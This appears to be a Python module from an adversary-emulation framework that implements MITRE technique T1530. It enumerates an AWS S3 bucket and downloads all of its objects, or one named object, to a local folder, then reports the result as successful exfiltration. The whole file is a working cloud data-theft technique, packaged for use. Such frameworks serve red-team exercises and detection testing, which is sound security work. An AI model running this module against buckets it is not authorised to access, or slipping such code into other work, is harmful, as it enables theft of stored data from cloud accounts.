from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import boto3
from botocore.exceptions import ClientError
from pathlib import Path
import os

@TechniqueRegistry.register
class AWSExfilS3Bucket(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1530",
                technique_name="Data from Cloud Storage",
                tactics=["Collection"],
                sub_technique_name=None
            )
        ]
        super().__init__("Exfiltrate S3 Bucket", "Exfiltrates all or specified objects from S3 bucket in AWS", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            bucket_name: str = kwargs.get("bucket_name", None)
            object: str = kwargs.get("object", None)

            if bucket_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": {"Error" : "Invalid Technique Input"},
                    "message": {"Error" : "Invalid Technique Input"}
                }
            
            # Ref: https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3/client/download_file.html

            # Initialize boto3 client
            my_client = boto3.client("s3")

            all_bucket_object_keys = []

            # Exfil all objects if no object specified by user
            if object in [None, ""]:
                # S3 object enumeration to get all objects in bucket
                response = my_client.list_objects_v2(Bucket=bucket_name)
                all_bucket_objects = response['Contents']

                for object in all_bucket_objects:
                    all_bucket_object_keys.append(object.get('Key'))

            # only add object specified to download list
            else:
                all_bucket_object_keys.append(object)

            # Initialize download counter
            object_download_counter = 0
            # Initialize list to track downloaded objects
            downloaded_objects = []

            # Create local download path with bucket name
            download_path = f"./output/s3_bucket_download/{bucket_name}"
            
            # Download all objects in list
            for object_key in all_bucket_object_keys:
                download_file = f"{download_path}/{object_key}"
                
                # check local download file path exists and create if not
                if Path(os.path.dirname(download_file)).exists():
                    pass
                else:
                    os.makedirs(os.path.dirname(download_file))
                
                # Download object
                my_client.download_file(bucket_name, object_key, download_file)
                # Add object to downloaded objects list
                downloaded_objects.append(object_key)
                object_download_counter += 1

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully exfiltrated S3 bucket - {bucket_name}",
                "value": {
                    "totals_object_exfiltrated" : object_download_counter,
                    "exfil_path" : download_path,
                    "objects_exfiltrated" : str(downloaded_objects)
                }
            }
        except ClientError as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to exfiltrate S3 bucket"
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to exfiltrate S3 bucket"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "bucket_name": {"type": "str", "required": True, "default": None, "name": "S3 Bucket Name", "input_field_type" : "text"},
            "object": {"type": "str", "required": False, "default": None, "name": "Bucket Object Name", "input_field_type" : "text"}
        }